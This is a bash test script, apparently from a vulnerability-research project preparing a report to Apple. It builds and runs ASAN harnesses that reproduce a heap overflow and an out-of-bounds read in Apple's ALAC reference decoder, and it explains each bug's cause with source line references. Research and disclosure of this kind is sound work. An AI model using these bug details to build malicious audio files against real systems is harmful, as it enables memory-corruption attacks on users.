#!/usr/bin/env bash
# C6.1 — ALAC PoC test: BB-038 (partialFrame numSamples heap overflow) and
# BB-039 (Init() magic cookie OOB read), ASAN-verified on the host.
#
# Clones apple/ALAC once into .w0lfsword/poclab/alac (cached), builds the
# harnesses from research/alac_poc/ with -fsanitize=address, runs both, and
# reports the ASAN verdicts.
set -euo pipefail
cd "$(dirname "$0")/.."

CACHE=".w0lfsword/poclab/alac"
mkdir -p "$CACHE"

if [ ! -d "$CACHE/codec" ]; then
    echo "  cloning apple/ALAC (cached in $CACHE) ..."
    git clone --depth 1 https://github.com/apple/ALAC "$CACHE" 2>/dev/null \
        || git clone --depth 1 https://github.com/macosforge/alac "$CACHE"
fi

cp research/alac_poc/harness_overflow.cpp research/alac_poc/harness_cookie.cpp "$CACHE/"
cd "$CACHE"

echo "  building harnesses (ASAN+UBSAN) ..."
g++ -fsanitize=address,undefined -g -I codec harness_overflow.cpp \
    codec/ALACDecoder.cpp codec/ag_dec.c codec/dp_dec.c codec/matrix_dec.c \
    codec/ALACBitUtilities.c codec/EndianPortable.c -o harness_overflow
g++ -fsanitize=address -g -I codec harness_cookie.cpp \
    codec/ALACDecoder.cpp codec/ag_dec.c codec/dp_dec.c codec/matrix_dec.c \
    codec/ALACBitUtilities.c codec/EndianPortable.c -o harness_cookie

echo ""
echo "  == BB-038: partialFrame numSamples heap overflow =="
out=$(./harness_overflow 2>&1 || true)
if echo "$out" | grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow'; then
    echo "  VERDICT: WORKS - heap-buffer-overflow WRITE reproduced"
else
    echo "  VERDICT: no ASAN hit (unexpected - check the toolchain)"
    echo "$out" | tail -3
fi
echo "  == BB-039: Init() magic cookie OOB read =="
out=$(./harness_cookie 2>&1 || true)
if echo "$out" | grep -q 'ERROR: AddressSanitizer: stack-buffer-overflow'; then
    echo "  VERDICT: WORKS - stack-buffer-overflow READ reproduced"
else
    echo "  VERDICT: no ASAN hit (unexpected - check the toolchain)"
    echo "$out" | tail -3
fi
echo ""
cat <<'EOF'
  why it works:
    - the 1-bit partialFrame flag overrides the caller's numSamples with 32
      bits straight from the bitstream (ALACDecoder.cpp:250-254), and nothing
      bounds it against mConfig.frameLength, which alone sizes mMixBufferU/V
      and mPredictor (calloc at ALACDecoder.cpp:135-139). numSamples > 
      frameLength -> heap write overflow (mMixBufferU[i]=val at :309, and
      *outPtr++=del in dyn_decomp ag_dec.c:321 on the compressed path).
    - Init() sniffs cookie[4..7] for 'frma'/'alac' BEFORE any size check
      (ALACDecoder.cpp:101-113); a tiny cookie reads OOB, and the -=12
      underflow on 5-12 byte cookies makes the 24-byte config read pass.
  caveat:
    - verified on the open-source reference decoder (what Apple ships in
      CoreAudio). The production AudioToolbox binary in the dyld cache is
      not disassembly-confirmed yet - do that before any Apple report.
    - docs: research/poclab.md, research/audio_frameworks.md
EOF
